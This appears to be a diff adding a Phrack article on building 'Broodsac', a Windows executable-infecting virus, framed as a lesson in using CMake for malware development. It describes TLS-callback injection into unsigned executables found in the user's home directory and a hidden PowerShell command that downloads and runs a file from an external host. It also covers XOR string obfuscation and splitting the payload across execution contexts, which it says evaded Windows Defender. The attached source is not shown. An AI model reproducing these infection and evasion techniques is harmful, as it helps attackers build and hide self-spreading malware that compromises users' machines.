@@ -1,0 +1,681 @@
+                             ==Phrack Inc.==
+
+                Volume 0x10, Issue 0x47, Phile #0x09 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ Broodsac ]=-------------------------------=|
+|=-----=[ A VX Adventure in Build Systems and Oldschool Techniques ]=----=|
+|=-----------------------------------------------------------------------=|
+|=--------=[ Amethyst Basilisk <amethyst.basilisk@gmail.com> ]=----------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Table of Contents
+
+    1. Introduction
+    2. Planning the Virus
+    3. Designing the Virus
+    4. Building the Virus
+    5. Dealing with Development Hazards
+       5.1. The Original Design Fails
+       5.2. Antivirus Catches It
+    6. Conclusions
+    7. Shouts
+    8. References
+    9. Artifacts
+
+--[ 1. Introduction
+
+There is nothing more thrilling than a successful payload. But in the
+pursuit of payloads, we are susceptible to dopamine addiction. And in 
+that addiction, we seek shortcuts to get our hit. Indeed, the urgence of 
+speed requires us to hunt these shortcuts as well. Just use bash glue. 
+Don't worry about code maintainability. I have the compiler, why make 
+things more complicated?
+
+It is easy to forget when pursuing our dark arts-- from viral writing to
+exploitation-- that in everything we do, we are creating software. And
+software gets complicated. Certainly, for shellcoding, it is merely a one-
+liner with NASM to create a binary blob of your creation. That's not
+complicated at all. But isn't the shellcode going somewhere? C won't let
+you simply merge binary blobs into your code. (Not until C23, anyway.) 
+
+And it's not always as easy as concatenating your creation onto your 
+executable. What if you want to encrypt the shellcode somehow? And what 
+if another program has to handle that shellcode? And that program might 
+be the payload of another program in the chain! This doesn't even begin 
+to consider what automation your assembly payload might require, such as 
+dynamic obfuscation.
+
+Our dark arts are a mess of project management-- payload factories,
+matryoshka obfuscation, a plethora of moving parts necessitating
+cleverness. It is not to say our quick hacks are not worthy of their
+purpose-- they are. But they are more often than not optimized for speed,
+not interoperability, maintainability or portability. A good build system,
+by sometimes sacrificing short-term speed of development, provides these
+things.
+
+Unix users are already familiar with this. One of the oldest build 
+systems, GNU Make and the autotools suite, is fundamental to sharing 
+and building code on Unix-like platforms. Windows users, however, don't 
+have this culture. Everything is Visual Studio projects. And like 
+everything Windows, the MSVC build system is a veritable black box 
+behind the Visual Studio IDE. The hackers who can wield MSVC's black 
+magic to their whim have undoubtedly inspired us with their mindblowingly 
+assembled payloads. Lord knows I would love to see SmokeLoader's build 
+system[10].
+
+You can think of this article as a cooking recipe. While the virus
+technique used here is nowhere near novel ("roy g biv already did it"), 
+it is wrapped in techniques and best practices to build any type of virus. 
+We will cover the use of a robust build system to construct our virus and
+discuss techniques for build systems that bolster our malware development. 
+We will also be covering some techniques necessary to circumvent Windows 
+Defender, as this is now the baseline we must develop against.
+
+To follow along, grab a copy of Visual Studio with C++ support, CMake
+(https://cmake.org) and NASM for Windows (https://nasm.us). To fully
+understand this article, you are expected to have a basic understanding 
+of PE files.
+
+--[ 2. Planning the Virus
+
+We want to write an executable infector for Windows. To do that, we need 
+to break down the moving pieces involved in an executable infector. While
+traditional executable infectors have gone out of style due to advances 
+in executable security, it can still be done-- especially in the advent 
+of developers not being able to afford or care for signing their binaries.
+(Hello, Rust!)
+
+At the outset in the abstract, we have two pieces: the *infector* and 
+the *infection*. The *infector* is obviously responsible for infecting
+executables it finds. The *infection* is simply whatever payload we want 
+to inject into various executables. Already, we have a dependency to work
+with: naturally, the *infector* relies on the *infection* in the build
+system, somehow. We want the infection to be flexible and portable so 
+it's as easy as possible to inject into executables. Shellcoding fits 
+this purpose perfectly.
+
+For writing quality shellcode, we stick with the C-then-ASM philosophy 
+of writing our payload. In Broodsac, we have opted to let the compiler's
+optimizer optimize our C code and hand-translated that into an assembly
+file. 
+
+While this can be tedious the larger the shellcode gets, we luckily don't 
+have to worry about traditional requirements of shellcode as it comes to 
+exploitation, since we're targeting an executable, not an exploitable 
+buffer. Therefore, we have relatively fewer limits. Additionally, because 
+Windows has support for both 32-bit and 64-bit binaries, and being the 
+dinosaur it is, 32-bit architecture is still relevant. So payloads for 
+both architectures will be necessary.
+
+At the outset of our plan, our virus hierarchy looks like this:
+
+   + broodsac
+        + infection
+            + ASM
+                 + 32
+                 + 64
+            + C
+
+The infection is purely a necessity of the infector, and as such, should 
+be contained within its directory as a dependency. We should provide 
+ourselves some external ability to compile the assembly payloads into 
+their own binary for testing purposes. This means, in the abstract, we 
+have roughly four binaries to work with-- the infector, the 32-bit ASM, 
+the 64-bit ASM, and the C payload. Our infector should merely only rely 
+on the assembly payloads, so we know we should somehow connect these 
+pieces at the outset to our infector build.
+
+Having the projects individually separated this way makes the moving 
+pieces easier to manage. Disaster, so to speak, is relatively contained 
+to the individual units, organized and in their place. From the outside--
+especially when accustomed to a hack-fast lifestyle-- you would not be
+blamed for seeing this organization as mere masturbation. Again, why 
+bother when I can just stick everything in the same folder and issue 
+compilation commands where I deem fit?
+
+Demons lurk in your code. That's why. They will snap out and pull you 
+under when you least expect it, splashing red on your screen, spewing 
+Stoustrup's nightmare inheritance, demanding refactoring for your sinful 
+C. Being organized and compartmentalized in your endeavors gives you the 
+territorial high ground in the battle of bugs. Being prepared for 
+something to go wrong turns these demons into mere irritants.
+
+Constructing a build system around your virus exposes the pain-points 
+when and where things go wrong, allowing you to quickly and elegantly 
+attend to the problem. It also acts as a functional, engineerable glue 
+to wrap around your build. The more complex your virus gets, the more a 
+solid build system becomes essential, freeing us from the chains of 
+uncreative compiler corporations.
+
+--[ 3. Designing the Virus
+
+We now have the abstract design of all the pieces of our virus. Next we
+need to fill in the blanks! We have two questions we need to answer:
+
+    + How should our virus infect the executable?
+    + What should our viral payload do?
+
+The first question was answered initially-- naively-- with code caves and
+PE file entrypoint redirection. Entrypoint redirection is a technique as
+old as EXE infections[1]. Unfortunately, code caves in executables aren't
+frequently in a size capable of handling the beast that is Windows
+shellcode. On average, you get around 200 bytes. Suitable for a Linux
+shellcode, not very good for a Windows shellcode.
+
+After some thinking, TLS directory injection[2] was settled upon. The TLS
+directory-- or Thread Local Storage-- is one of many directories within a
+PE file. It is responsible for ultimately managing thread memory storage
+tactics within the given executable. A notable trait of the TLS directory
+is initialization callbacks. There can be many, and they're iteratively
+called on process startup. In other words, the TLS directory takes
+precedence over the main routine, as the TLS directory initialization is
+part of the PE loading process. Remember this last part-- it will bite us
+in the ass later.
+
+There is a matter of how our TLS section gets inserted into the binary. 
+We have simply opted to insert a new section, as we can provide a 
+guarantee that the section will be executable and writable, as opposed 
+to containing other metadata such as program resources. If we wanted to 
+be stealthier about the infection, we could control for executable 
+sections and apply the 29A technique[3] of expanding the last section 
+in the executable. Naturally, the trade-off for stealth here will be to 
+reduce potential attack surface and-- perhaps intentionally-- increasing 
+complexity of detecting the infection. The power is yours.
+
+We want executable targets. Where do we find them? Surprisingly, in the
+user's home directory. Gone are the days of every program installing 
+itself in the Program Files directory, now is the dawn of AppData and the 
+user's document folder where they unzip various packages of unsigned 
+executables. We can simply recursively iterate the user's home directory 
+for targets.
+
+As for what it should do on infection? I'm a particular fan of the 
+Desktop Pet project[4], formerly known as eSheep in the 90s. An 
+appropriate payload to send up an infection technique from the 90s. 
+It provides a great visual if the payload executes for testing purposes. 
+Our payload should simply download (if the file doesn't exist) and execute 
+this cute little sheep onto the user's desktop. Who would oppose such 
+adorable software augmenting executables with a delightful animal friend? 
+A simple download-exec of this payload will be perfect.
+
+--[ 4. Building the Virus
+
+Quick and dirty, to build Broodsac, uudecode the artifacts in section 9 
+to get the tarball, extract it, and run the following:
+
+    $ cd broodsac
+    $ mkdir build
+    $ cd build
+    $ cmake ../ -A x64
+    $ cmake --build ./ --config Release
+
+Naturally, I am assuming you won't be foolish enough to run the result on 
+a system you don't want tampered with. Unless you *want* sheep friends in
+your executables, then by all means.
+
+While you are building your virus, you are undoubtedly going to encounter
+bugs. Considering we are building software, we should borrow from
+software's philosophy of creating and performing tests. These do not have
+to be formal unit tests, per se, where functionality is verified at
+individual code points, but they should somehow test the functionality 
+of your virus. Considering the volatility of the undefined behavior of 
+targets we work with in our dark development, you should absolutely 
+build with tests in mind at the forefront.
+
+There are three key questions we need to consider for our testing 
+purposes:
+
+    + Does the payload work?
+    + Does the infector successfully infect?
+    + Does the infection succeed without disrupting original execution?
+
+The first question has an actionable task for us: how do we test this?
+Naturally, we don't have to do it programatically-- we simply need to run
+the payload in its many forms to see if it successfully launches a cute
+little sheep. C and Assembly have various development pitfalls that will
+become apparent during this simple testing process. To build and test our
+64-bit payload, for example, we can simply do this:
+
+    $ cd infection/asm/64
+    $ mkdir build
+    $ cd build
+    $ cmake ../ -DINFECTION_STANDALONE=ON -A x64
+    $ cmake --build ./ --config Release
+    $ ./Release/infection_asm_64.exe
+
+If our payload succeeds, we are rewarded with a cute little sheep. 
+A simple test.
+
+This is similar to the configure/make process on Linux. CMake takes the
+CMakeLists.txt in the target directory and builds the configuration for
+your compilation tools necessary in order to perform a build. We have
+configured our ASM files to be compileable as either standalone binaries 
+for individual testing, or as static libraries to be included with the 
+infector binary.
+
+A static library was chosen as the method of merging our payloads into our
+binary because it's simple and elegant, since the payload's architecture
+will match. Instinctively, we see shellcode as a unit to be stored away, 
+to be converted to a hex string and stashed away in some C code. So we 
+wind up doing creative things with it, as to us, it is merely a blob of 
+data to be wrangled into something. We tend to forget that the shellcode 
+can be its own individual code unit.
+
+But with a build system on your side, you can augment the way your
+shellcode comes out at the compilation stage. After doing various build
+customizations to our shellcode payload, in our infector binary's CMake
+file, we include this and the 32-bit version this way:
+
+    add_subdirectory(${PROJECT_SOURCE_DIR}/infection/asm/32)
+    add_subdirectory(${PROJECT_SOURCE_DIR}/infection/asm/64)
+
+    add_executable(broodsac WIN32 main.c)
+    target_link_libraries(broodsac infection_asm_32 infection_asm_64)
+
+In a rather clean way, with a simple set of "extern" keywords in the
+infector's main.c file, we have included our shellcode payloads into the
+main binary. While not shown yet, in addition to this process, we have
+managed to automate a step of encrypting the strings within the payload
+code, so every time our build is executed, the strings are re-encrypted 
+and re-assembled in the infector executable. 
+
+We have avoided the tedium of manually converting our shellcode into an 
+array of some kind and even added an obfuscation step along the way. 
+The beauty of this method is that it avoids the unseen hazards that tend 
+to spring up from the speedy solutions we're used to. And at the end of 
+the day: it's just good software development practice.
+
+Let's get back to our questions. The other questions, while having the 
+same action item, have a more complicated answer. We need to test and 
+analyze the infected executables to verify and debug infections. So we 
+need to enumerate what we need to test based on our design intent.
+
+Because we're dealing with the TLS directory, we are dealing primarily 
+with *virtual addresses*, as opposed to RVA and offsets. Virtual addresses 
+tend to imply the need for relocations within the binary. This is 
+absolutely something we need to deal with as an executable infector-- with 
+the ubiquity of Address Space Layout Randomization (aka /DYNAMICBASE), 
+we would be stupid to not consider modifying the relocation directory of 
+a target executable in the case of infection.
+
+Thus, we have four states of configuration to test infection against:
+
+    + no tls directory present, no relocation directory present
+    + no tls directory present, relocation directory present
+    + tls directory present, no relocation directory present
+    + tls directory present, relocation directory present
+
+In addition to this, we need to consider targeting the 32-bit architecture
+as well, creating a total of 8 binary configurations to test against! This
+brings the total code projects in our virus project to 12. With a good
+build system, we can construct all these test binaries rather easily:
+
+    $ cd infectables
+    $ mkdir build32 build64
+    $ cd build32
+    $ cmake ../ -A Win32
+    $ cd ../build64
+    $ cmake ../ -A x64
+
+The build scripts can basically follow a folder hierarchy and build
+multiple projects contained within, which is what's happening here. 
+We now have two configured build environments-- one for 32-bit and one 
+for 64-bit.
+
+    $ cd build32
+    $ cmake --build ./ --config Release
+    $ cd ../build64
+    $ cmake --build ./ --config Release
+
+This will place all the binaries in the Release directory within the 
+build environment. They can then be targeted for infection by our 
+infector executable for testing purposes. Like the compiler at the 
+command line, we can configure various switches to define CMake headers. 
+We can configure our infector to be aware of a directory containing our 
+infectable executables:
+
+    $ mkdir build
+    $ cd build
+    $ cmake -DBROODSAC_DEBUG=ON -DBROODSAC_INFECTABLES="infectables" \
+      -A x64 ../
+
+This command effectively builds Broodsac in debug mode. Rather than
+targeting the user's home directory, it will instead target the infectable
+directory, where our test programs are currently built. By running 
+Broodsac in this state, we can easily verify the state of infection and 
+its corresponding payload. And this is of utmost importance-- the demons 
+that hit the hardest, lurk the lowest. Robust testing will help to 
+eradicate them.
+
+--[ 5. Dealing with Development Hazards
+
+The result of the virus you see here is a labor of love, of many hours
+spent debugging, testing, verifying, fixing and refactoring. But when 
+you see the final product, what you don't see are those little steps 
+along the way that ultimately built the product before you. So it's hard 
+to appreciate the struggle, the fight that comes with software 
+development. It is, for the most part, an individual journey that 
+everyone who writes code wanders on.
+
+It is very easy to laugh at a good, terrible bug. It amazes us when stupid
+bugs seem to have a persistent lifetime, just waiting to be discovered by
+the next lucky actor. But bugs are part of the life-cycle of software,
+whether exploitable or not, and as you cannot escape the gravitational 
+pull of software development as a virus writer, you may as well embrace 
+its best practices.
+
+This section focuses on two pivotal points of critical failure in the
+process of developing this virus: a point when an initial payload idea
+failed at the last minute, and the point when antivirus seemed to start
+detecting our infections.
+
+--[ 5.1 The Original Design Fails
+
+Do you remember when I said the TLS directory would come back to bite us 
+in the ass? How did having a robust build system help us with that?
+
+Originally, our payload was a very simple, sensible program: import 
+GetFileAttributes, URLDownloadToFileA and ShellExecuteA. This would 
+essentially be all we needed to download our sheep and run it on the 
+target system. To help explain the chaos we mitigated, let's break down 
+the steps we need to generate and test our final payload, the infector:
+
+    1. compile the C infection
+    2. test the C infection
+    3. translate to assembly on 32-bit and 64-bit architectures
+    4. compile the assembly (2x)
+    5. test the assembly (2x)
+    6. incorporate the shellcode into our infector
+    7. compile the infector
+    8. test the infector
+    9. verify the infections succeed
+
+When we fully enumerate the steps needed to build a sound virus, we can
+appreciate the simplification a build system provides a complex ecosystem.
+Because at any given step in this process, something can fail. At any 
+given point in the process, if there *is* failure, we will have to restart 
+at a certain point. The more time it takes to resume where we failed, the 
+more time that is wasted. And not being clear from an organizational 
+standpoint where you need to go to restart is a time waster. A good build 
+system saves you time, a very precious resource.
+
+In this case, it was discovered that ShellExecuteA and URLDownloadToFileA
+were failing all the way at step 9. Ass status: bitten. And look at when 
+it chose to bite us-- testing, rather than deployment. Why was it bitten? 
+Our infection technique of TLS injection.
+
+Due to choosing to perform TLS injection on the binary, we were tempted by
+the fact that we got precedence over the entrypoint of the infected
+executable. But this means we're currently executing in the context of the
+executable loader. This means our infected executable is not yet fully
+loaded. In particular to our conundrum, *threads* are not yet fully
+initialized. It was observed when ShellExecuteA and URLDownloadToFileA 
+were executed within the context of a TLS directory callback, they would 
+hang. It was noted, too, that the process attempted to create a thread 
+before it hung. This likely meant we could not use any functions which 
+wound up spawning threads.
+
+The payload was changed to something slightly less conventional:
+CreateProcessA. While not unconventional for our payload program, the way
+we eventually went about downloading the payload certainly was.
+CreateProcessA eventually calls NtCreateProcess, a function of ntdll.dll
+which ultimately culminates in a kernel syscall. This would undoubtedly 
+be thread-safe in our TLS directory. So how did we eventually download 
+our payload? A call to Powershell.
+
+Certainly goofy for a shellcode payload to make an external call to
+Powershell when the API is at your fingertips, isn't it? So is the nature
+of hacking-- when faced with a challenge, we heed the call with non-
+standard solutions, in spite of our opinions, when it simply works.
+
+Nonetheless, this solution required a significant rewrite of the code. 
+The C payload would need to be rewritten, recompiled, translated into 
+assembly, those assembly files compiled, and stuck back into our infector.
+Essentially, we are forced to go back to the beginning of our steps
+enumerated and work our way back to our infector. That's a lot of time, and
+even more steps to take without the simplification provided by a build
+system!
+
+But with everything glued together, the only time we are wasting is simply
+the equivalent of raking the sand in our zen garden: coding and analyzing.
+All because our build system makes our complicated abstract verification
+steps relatively mindless:
+
+    $ cd infection/c/build
+    $ cmake --build ./
+    $ ./Debug/infection_c.exe # any sheep? try again
+    $ cmake --build ./ --config Release # for translating to asm
+    $ cd ../../asm/32/build
+    $ cmake --build ./
+    $ ./Debug/infection_asm_32.exe # any sheep? try again
+    $ cd ../../64/build
+    $ cmake --build ./
+    $ ./Debug/infection_asm_64.exe # any sheep? try again
+    $ cd ../../../../build # footgun: are you debug configured?
+    $ cmake --build ./
+    $ ./Debug/broodsac.exe # at least you just get sheep if you footgun
+
+Every step where something could functionally go wrong is isolated into 
+its own place, manageable in their own regards. Each action we need to 
+create our virus, from payload to delivery, is instrumented and flows 
+smoothly between one another. When something goes wrong at any point in 
+this chain, we know exactly where to restart, and can quickly act and 
+tackle the issue.
+
+It's one thing to be agile when it comes to mitigating the demons of bugs,
+though, but what of the demons of emergency feature requests? It is not
+merely a push of management that inspires such spikes in development, but
+of surprise necessity.
+
+--[ 5.2 Antivirus Catches It
+
+It was incredibly amusing to me when I noticed the sheep being detected as
+malware. Curious, because the sheep itself was technically benign-- the
+infector and the infection were actually the malware. Initially, I
+whitelisted it in Windows Defender while I was working and didn't really
+think anything of it, I'll fix it later. Eventually, I had to face the
+music and figure out why my virus was being detected, even if the sheep 
+was curiously benign.
+
+The hints we were receiving from Windows Defender was that it was some 
+kind of script that triggered it, and that the signature it was hitting 
+on was called "Trojan-Script/Wacatac.B!ml." Some research on the signature 
+told us absolutely nothing, as procedurally generated signatures are wont 
+to do. It did manage to tell us that everyone is pissed that all sorts of 
+random benign executables were being flagged as Wacatac. We're being taken 
+down by a false positive? Positively embarrassing.
+
+Anyway, it seemed clear that with the script hint that it was triggering 
+on our Powershell one-liner. I didn't even bother to obfuscate the command 
+in any way whatsoever, so it's no wonder it got caught in the end. We
+later confirmed thanks to some Windows Defender signature research[5] 
+that our download string was absolutely in there, somewhere, so surely 
+this was the culprit. This means, now, we would have to obfuscate it. 
+
+Sure, we could just do it one-and-done and hardcode it into the assembly 
+files, but where's the fun in that? They'll just flag the encrypted blob 
+and call it a day! Where's the flexibility in that? And what if I need to 
+change the eventual command entirely? How can I make this as painless as 
+possible for me and others who want to transform this code?
+
+The beauty of a good build system is an ability to humbly offload build
+commands to another process at specific points in the build. Let's look
+at the code in our payloads which encrypts the strings:
+
+    add_custom_command(TARGET infection_asm_64
+      PRE_BUILD
+      COMMAND powershell ARGS
+      -ExecutionPolicy bypass
+      -File "${CMAKE_CURRENT_SOURCE_DIR}/../strings.ps1"
+      -payload_program "\\??\\C:\\ProgramData\\sheep.exe"
+      -payload_command "sheep"
+      -download_program "\\??\\C:\\Windows\\System32\\WindowsPowerShell\
+    \\v1.0\\powershell.exe"
+      -download_command "powershell -ExecutionPolicy bypass \
+    -WindowStyle hidden \
+    -Command \"(New-Object System.Net.WebClient).DownloadFile(\
+    'https://amethyst.systems/sheep.dat', 'C:\\ProgramData\\sheep.exe')\""
+      -output "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection_strings.asm"
+      VERBATIM)
+
+Powershell was chosen simply because it's easier to work with than the
+oldschool CMD. A simple script was created which transformed the many
+strings we needed to encrypt, chooses a random key, then does the
+traditional xor-encrypt on the string. The script produces a NASM include
+file and dumps it into the binary directory of the build system--
+essentially the catch-all directory for any generated artifacts. We then
+include that directory in the assembler directives so our assembly files
+can see it:
+
+    target_include_directories(infection_asm_64 PUBLIC
+      "${CMAKE_CURRENT_SOURCE_DIR}"
+      "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>")
+
+As creatives whose canvas is questionable machine code, we can no doubt
+see the attractiveness and capability that this brings. If you're really
+feeling saucy, you can even mutate COFF objects and incorporate them with
+specific library configurations via CMake as well! Mucking around with
+object files directly would look something like this:
+
+    add_library(obfuscateme STATIC obfu.c)
+    add_custom_command(TARGET obfuscateme
+    PRE_LINK COMMAND obfuscate ARGS
+    "${CMAKE_CURRENT_BINARY_DIR}/obfuscateme.dir/$<CONFIG>/obfu.obj")
+    add_executable(virus main.c)
+    target_link_libraries(virus obfuscateme)
+
+What these simple four lines wind up doing is compiling a set of
+functionality that needs to be obfuscated, calling the obfuscator on our
+compiled object file, which is then reincorporated into our build process
+at the linking stage, then adding the obfuscated code as a library
+dependency of the main virus. Whenever the virus target is called to be
+compiled, the functionality will be obfuscated and incorporated into our
+code automatically. Fundamentally, if you can call an external command to
+generate anything as part of your build process, the sky's the limit with
+what you can incorporate into your program.
+
+As exciting as the implications of these particular capabilities are, our
+thought to mask the signatures we thought we were hitting on was not
+sufficient. See, as the Defender signature research[5] demonstrates, there
+are multiple types of signatures to deal with, and according to
+DefenderCheck[6] and the slightly more advanced ThreatCheck[7], I was not
+hitting on static signatures. Indeed, digging into the guts of the threat
+names in the defender signature database proved relatively fruitless for
+hints on how to evade-- there was a static signature algorithm that wasn't
+quite coherent on how it was being scanned and, more importantly, a thing
+called a "NID."
+
+A NID, in this case, appears to identify something within the Network
+Realtime Inspection Service.[8] Probably some sort of metadata information
+about certain behavior. This means our signatures were likely triggering
+on a behavioral signature! How could we get around this?
+
+Naively, having not run into this before, we threw random shit at the wall
+to see if it worked. Hell's Gate? The Network Realtime Inspection Service
+wasn't exactly an EDR, so naturally, it didn't work. Not to mention, with
+Microsoft's unique position on the Windows landscape (they are the dungeon
+master), attempting to evade EDR just isn't nearly deep enough. But for 
+the sake of completeness of potential evasions, it was left in Broodsac's
+payload. (The Hell's Gate implementation consists of direct syscalls, not
+indirect syscalls, so it still could use some work.)
+
+Fundamentally, a behavioral signature relies on chaining certain actions
+together to declare something as potentially nasty. Let's step through 
+what our payload essentially does that could get flagged as potentially
+malicious:
+
+    + download an executable
+    + perhaps decrypt the executable
+    + execute the executable
+
+Frankly I see nothing wrong with this, but apparently Microsoft disagrees!
+
+A funny quirk about behavioral analysis, though, is that it relies on
+identifying the behavior of a given execution context, not the sum of its
+executions. In order for behavioral analysis to succeed, the bad behaviors
+which happen in combination need to happen within the same execution
+context. If we split the three tasks above into three separate execution
+contexts-- download, decrypt and execute-- will this be sufficient to
+bypass the behavioral detection?
+
+Yes! While I did not reverse-engineer NisSrv.exe to see the why's of why I
+evaded, the theory of splitting up tasks across execution contexts
+succeeded in bypassing Defender. The payload thus evolved into an
+interesting multistage payload. The user would have to run the infected
+executable multiple times before a sheep would appear. This would have
+the added benefit of confusing stealth. Where is the sheep coming from?
+Why does it keep happening when I run this program? Baffling! But 
+adorable. In this way, Broodsac lives up to the name of the multi-staged 
+worm it was named after, the green-banded broodsac.[9]
+
+Our zen garden is tended, and ready to be shared, for others to meditate
+upon and ponder for their own gardens. For that meditation, the various
+code objects contained in the tarball attached to this article have been
+annotated with comments to explain the individual code areas and what
+they're doing. Naturally, the complexity of the dinosaur that is the PE
+format comes with annoying, disgusting tricks and habits that make one
+ashamed of their code in the first place. I apologize on Mark Zbikowski's
+behalf.
+
+--[ 6. Conclusions
+
+It is without a doubt that the strange developmental anomalies you see 
+within wild samples of malware are the byproduct of some sort of build 
+system. SmokeLoader's use of encrypted functions is certainly not a 
+feature of the MSVC compiler[10]. But even a nasty rewrite of a C-file 
+being dumped into a directory for an IDE to compile, while quick and dirty 
+as we hackers love to do, would technically count as a build system. After 
+all, the Visual Studio IDE is merely a shell for the build system that is 
+MSVC. But as virus writers, we are still technically engineers at the end 
+of the day. We long for the beautiful solution to the problem. 
+We ultimately want our own little zen garden to tend to.
+
+The beauty of CMake in particular is in the fact that it's cross-platform. 
+So if you have code-- for example, an obfuscation engine-- that is capable 
+of being used on multiple platforms, CMake can be used to make building 
+the project on each platform relatively painless. Just like how CMake 
+wrangles MSVC, it can also wrangle the complex build environment that is 
+GNU Make. Many other build targets are supported-- but some not as fully 
+as MSVC and GNU. Exotic targets may have some difficulty.
+
+I hope I have made a good argument for incorporating build systems into
+your payload development. While we can certainly get by with surface shell
+scripts, wouldn't it be wonderful to get into the guts of the machine at
+the linker level? Linux developers have that privilege, why not liberate
+that access on Windows? After all, we're all effectively the demons of our
+target operating systems-- we lurk at the lowest level of the machine, and
+we love it here.
+
+--[ 7. Shouts
+
+0x6d6e647a for editing, dc949 for being family, slop pit for memes and
+hardchats.
+
+--[ 8. References
+
+[1]: 40Hex #8: An Introduction to Nonoverwriting Virii, Part II: EXE
+     Infectors,
+     https://amethyst.systems/zines/40hex8/40HEX-8.007.txt
+[2]: 29A #6: W32.Shrug, by roy g biv,
+     https://amethyst.systems/zines/29a6/29A-6.615.txt
+[3]: 29A #2: PE infection under Win32,
+     https://amethyst.systems/zines/29a2/29A-2.3_1.txt
+[4]: https://github.com/Adrianotiger/desktopPet
+[5]: https://github.com/commial/experiments/tree/master/windows-defender
+           /VDM
+[6]: https://github.com/matterpreter/DefenderCheck
+[7]: https://github.com/rasta-mouse/ThreatCheck
+[8]: https://techcommunity.microsoft.com/t5
+           /security-compliance-and-identity
+           /enhancements-to-behavior-monitoring-and-network-inspection
+           /ba-p/247706
+[9]: https://en.wikipedia.org/wiki/Leucochloridium_paradoxum
+[10]: https://www.sentinelone.com/blog
+           /going-deep-a-guide-to-reversing-smoke-loader-malware/,
+           see "Decoding the Buffer"
+
+
+--[ 9. Artifacts
+
+|=[ EOF ]=---------------------------------------------------------------=|
